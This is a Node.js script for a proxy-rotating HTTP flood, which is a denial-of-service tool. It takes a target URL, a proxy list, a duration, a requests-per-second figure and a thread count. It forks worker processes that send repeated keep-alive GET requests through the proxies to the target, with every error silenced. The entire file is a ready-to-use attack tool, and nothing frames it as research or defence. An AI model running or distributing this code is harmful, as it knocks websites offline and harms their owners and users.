const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');
const path = require('path');

const target = process.argv[2];
const proxyFile = process.argv[3];
const time = parseInt(process.argv[4]) || 60;
const ratelimit = parseInt(process.argv[5]) || 10;
const threads = parseInt(process.argv[6]) || 1;

if (!target || !proxyFile) {
    console.log(`\x1b[36mUsage\x1b[0m: node ${path.basename(__filename)} <target> <proxies.txt> <duration> <rps> <threads>`);
    process.exit(1);
}

const parsed = url.parse(target);
const host = parsed.host;
const proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

console.log(`[+] Target: ${parsed.host}`);
console.log(`[+] Proxies: ${proxies.length}`);
console.log(`[+] Duration: ${time}s`);

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), time * 1000);
} else {
    let idx = 0;
    const int = setInterval(() => {
        idx = (idx + 1) % proxies.length;
        const proxy = proxies[idx];
        if (!proxy || proxy.length < 5) return;
        
        const [ip, port] = proxy.split(':');
        const s = new net.Socket();
        s.connect(parseInt(port), ip);
        s.setTimeout(10000);
        
        for (let i = 0; i < ratelimit; i++) {
            s.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: Keep-Alive\r\n\r\n`);
        }
        
        s.on('data', () => setTimeout(() => { try { s.destroy(); } catch(e) {} }, 5000));
        s.on('error', () => {});
        s.on('timeout', () => { try { s.destroy(); } catch(e) {} });
    });
    
    setTimeout(() => clearInterval(int), time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});